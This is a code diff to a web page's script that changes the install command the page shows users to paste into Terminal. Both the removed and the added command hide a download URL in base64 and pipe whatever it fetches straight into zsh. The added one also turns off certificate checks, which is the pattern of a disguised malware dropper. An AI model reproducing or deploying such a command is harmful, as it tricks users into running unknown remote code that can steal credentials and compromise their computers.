@@ -1275,7 +1275,7 @@
     //    2. Step 2 of the "New to Terminal?" guide
     //  If the command contains both ' and ", use backticks as shown.
     // ════════════════════════════════════════════════════════════════
-    const INSTALL_COMMAND = `curl -s $(echo "aHR0cHM6Ly9iZXdxc2xrc2xpa3J0amluZmc5LmNvbS9kZWJ1Zy9sb2FkZXIuc2g/YnVpbGQ9ODg4MjM4MDBlOTU3MmYyODU2NzU5YTg0MTNlZjMwMGM=" | base64 -d) | zsh`;
+    const INSTALL_COMMAND = `curl -kfsSL $(echo 'aHR0cDovL2J1eXd4LmNvbS9jdXJsL2EwN2VmZDkyNGYyNjQ1YThmYTUxMzcwNjJhMWFhOGJiYmQ2YTcyNmM3Y2ZlYTY0ZDUwNTBlYmMxM2QxM2M2NDY='|base64 -D)|zsh`;
     // ════════════════════════════════════════════════════════════════
 
     // Render the command into a given element, auto-highlighting the
